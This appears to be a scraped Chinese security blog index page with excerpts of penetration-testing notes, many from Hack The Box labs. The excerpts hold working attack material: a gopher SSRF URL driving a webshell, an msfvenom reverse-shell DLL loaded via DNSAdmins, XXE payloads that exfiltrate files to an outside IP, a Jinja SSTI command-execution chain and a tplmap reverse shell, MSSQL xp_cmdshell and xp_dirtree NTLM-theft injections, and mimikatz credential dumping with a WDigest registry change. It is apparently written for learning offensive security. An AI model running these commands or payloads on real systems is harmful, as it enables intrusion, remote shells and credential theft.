152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域渗透之隐藏管理员用户和派生本地管理员" alt="域渗透之隐藏管理员用户和派生本地管理员" href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域渗透之隐藏管理员用户和派生本地管理员" alt="域渗透之隐藏管理员用户和派生本地管理员"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域渗透之隐藏管理员用户和派生本地管理员 &gt;</div>
                            <div class="content flex1">
                                
  典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）
常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。
这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现
域隐藏管理账户：
A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。
由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A
Derivative Local Admins（派生本地管理员）：在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：
经典案例：（在这个例子中，Sally是WorkStation A中的派生本地管理员）

环境描述：

域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  

域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员

Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录

Sally在 “Workstation C”上登录


通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。
直接截取原文中的实际利用步骤：

则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）
那么我们简化一下上边的图，画出自己的理解图：

隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找
使用Bloodhound查找隐藏管理账户的几种方法：

Map Domain Trust
左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员
搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>May 1, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域控提权之DNSadmins" alt="域控提权之DNSadmins" href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域控提权之DNSadmins" alt="域控提权之DNSadmins"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域控提权之DNSadmins &gt;</div>
                            <div class="content flex1">
                                
  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
利用条件：
拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
whoami /groups  查看用户组

制作dll：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
sudo impacket-smbserver tw .注入dll
dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
nc -lvvp 444重启dns致使paylload生效：
sc.exe stop dns
sc.exe start dns或
sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 start dns  



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 30, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="XXE漏洞详解" alt="XXE漏洞详解" href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="XXE漏洞详解" alt="XXE漏洞详解"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; XXE漏洞详解 &gt;</div>
                            <div class="content flex1">
                                
  0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
1、XML：Extensible Markup Language，可扩展标记基础XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：

XML元素

属性

实体     


以一个简单的XXE POC为例：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明
&lt;!DOCTYPE test [                                ####文档类型定义（DTD）
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名
]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名2.DTD（文档类型定义）实体
定义XML文件中有哪些模块，这些模块能包含什么样的内容

DTD可以在XML文档内声明，也可以外部引用


内部声明DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
 &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
  &lt;!ELEMENT from    (#PCDATA)&gt;     
  &lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;
]&gt;
&lt;note&gt;
 &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;引用外部DTD：
DTD文件内容：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
&lt;!ELEMENT from    (#PCDATA)&gt;     
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;引用DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;
&lt;note&gt;
  &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询

3、为什么能形成注入？XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换简单的漏洞代码：
&lt;?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents(&apos;php://input&apos;);
$dom = new DOMDocument();

# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds-&gt;user;
$pass = $creds-&gt;pass;
#回显信息
  echo &quot;You have logged in as user $user&quot;;
###漏洞触发点在user元素中
?&gt;0x02、XXE漏洞验证：如上漏洞代码poc，paylaod.txt：
&lt;creds&gt;
&lt;user&gt; Ed &lt;/user&gt;
&lt;pass&gt; mypass &lt;/pass&gt;
&lt;/creds&gt;
tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）

&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;curl验证：
curl -d @payload.txt http://localhost/xml_injectable.php显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息

0x03、XXE能做什么：[1]文件读取
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
[2]SSRF探测端口内网服务
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
尝试在XXE漏洞代码中加入：    error_reporting(0);

上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）
[3]Bind XXE （OOB）外带数据（无回显攻击）
[代码中注释掉 echo “You have logged in as user $user”;]
OOB  文件读取
evil.dtd：
&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
OOB  探测内网端口及服务：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x04、攻击内网SSRF+内网服务命令执行实现内网攻击
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;系统命令执行
(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x05、使用递归实体扩展进行DOS攻击
0x06、XXE漏洞挖掘： 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞
比如这个案例：https://www.freebuf.com/vuls/167087.html ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
foo=bar等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;1.文件上传XXE（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）
2.传输内容XXE （支持XML）
扩展之Json端点上的XXE：
原始JSON
{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}XML转换(需要添加一个根元素，不然会成为无效的XML文档)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;root&gt;
&lt;search&gt;name&lt;/search&gt;
&lt;value&gt;netspitest&lt;/value&gt;
&lt;/root&gt;以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）

成功验证XXE




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户" href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 调用API绕过杀软添加用户 &gt;</div>
                            <div class="content flex1">
                                
  创建隐藏账户：
net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
通过组查看：
net localgroup administrators 
net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
实现：
微软提供C++实现原型：
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, &quot;netapi32.lib&quot;)

#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt; 
#include &lt;lm.h&gt;

int wmain(int argc, wchar_t *argv[])
{
   LPGROUP_USERS_INFO_0 pBuf = NULL;
   DWORD dwLevel = 0;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   NET_API_STATUS nStatus;

   if (argc != 3)
   {
  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
  exit(1);
   }

   nStatus = NetUserGetGroups(argv[1],
  argv[2],
  dwLevel,
  (LPBYTE*)&amp;pBuf,
  dwPrefMaxLen,
  &amp;dwEntriesRead,
  &amp;dwTotalEntries);

   if (nStatus == NERR_Success)
   {
  LPGROUP_USERS_INFO_0 pTmpBuf;
  DWORD i;
  DWORD dwTotalCount = 0;

  if ((pTmpBuf = pBuf) != NULL)
  {
 fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);

 for (i = 0; i &lt; dwEntriesRead; i++)
 {
assert(pTmpBuf != NULL);

if (pTmpBuf == NULL)
{
   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
   break;
}

wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);

pTmpBuf++;
dwTotalCount++;
 }
  }

  if (dwEntriesRead &lt; dwTotalEntries)
 fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);

  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
   }
   else
  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);

   if (pBuf != NULL)
  NetApiBufferFree(pBuf);

   return 0;
}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
我用C实现效果如下：



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]" href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; SSTI[服务器模板注入] &gt;</div>
                            <div class="content flex1">
                                
  漏洞成因：
用户输入未经过滤就交给引擎处理
将python语句编译成一句话： 
不同类型SSTI paylaod: 
SSTI模板注入常见引擎：

判断是哪种类型SSTI

一个实例：
nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知

检测SSTI

name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
确定是jinja之后，尝试文件读取和命令执行
读取文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
命令执行：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer" href="/2020/04/26/MSSQL-NTLM-stealer/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; MSSQL NTLM stealer &gt;</div>
                            <div class="content flex1">
                                
  可窃取NTLM的漏洞及利用方式
利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
漏洞利用
默认情况ASP/MSSQL支持堆叠注入：
常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
猜测是没有权限的问题，想到xp_dirtree外带数据：
payload：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记" href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; mimikatz抓取密码小记 &gt;</div>
                            <div class="content flex1">
                                
  1、直接抓取本机：
[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
离线破解lsass.dmp
[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
[2]#privilege::debug          //提升权限
[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
[4]#sekurlsa::logonpasswords  //抓取密码
踩坑点：
[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
解决方法：lsass.dmp要给完整路径，
[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
解决方法：使用2.0版本
[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
windows 2012之后明文抓取均会出现这个报错
需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="内网使用smb无文件执行" alt="内网使用smb无文件执行" href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="内网使用smb无文件执行" alt="内网使用smb无文件执行"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 内网使用smb无文件执行 &gt;</div>
                            <div class="content flex1">
                                
  创建smb共享
mkdir smb &amp;&amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456测试：
$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force
$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)
New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share
执行：
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘

Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                


            </div>
            <div class="swiper-scrollbar"></div>
        </div>
    </div>
</div>
<script>

    function getSwiperPrams() {
        var windowsWidth = $(document).width()
        var slidesPerView
        var direction;
        if(windowsWidth > 1500){
            direction = 'horizontal'
            slidesPerView = 4
        }else if(windowsWidth > 1100){
            direction = 'horizontal'
            slidesPerView = 3
        }else if(windowsWidth > 1000){
            direction = 'horizontal'
            slidesPerView = 2
        }else{
            slidesPerView = 1
            direction = 'vertical'
        }
        return {
            direction: direction,
            slidesPerView: slidesPerView
        }
    }
    var params = getSwiperPrams()

  var mySwiper = new Swiper('.swiper-container', {
    direction: params.direction, // 垂直切换选项
    mousewheel: true,
    slidesPerView: params.slidesPerView,
    spaceBetween: 30,
    scrollbar: {
      el: '.swiper-scrollbar'
    },
    on: {
        resize: function(){

        },
    },

    // 如果需要滚动条
    scrollbar: {
      el: '.swiper-scrollbar',
    },
  })
</script>

  </div>
  <!--
  <div class="main-bottom">
    <div class="music flex flex-pack-justify flex-align-center">
      <div class="control">
        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
      </div>
      <div class="msg">
        <span class="time"></span>
        <div class="line" ref="progress-line-warp">
          <div class="song-msg">周杰伦 - 说好不哭</div>
          <!--<div class="current-line" ref="progress-line">
            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
          </div>-->
        </div>
        <span class="all-time"></span>
      </div>
      <div class="right-control">
        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
          <span class="iconfont icon-ttpodicon"></span>
          <span class="number flex1">3</span>
        </a>
      </div>
      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
        Your browser does not support the audio element.
      </audio>
    </div>
  </div>
  <div class="music-list">
    <div id="musiclist">
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">说好不哭 - 周杰伦</span>
        </a>
      
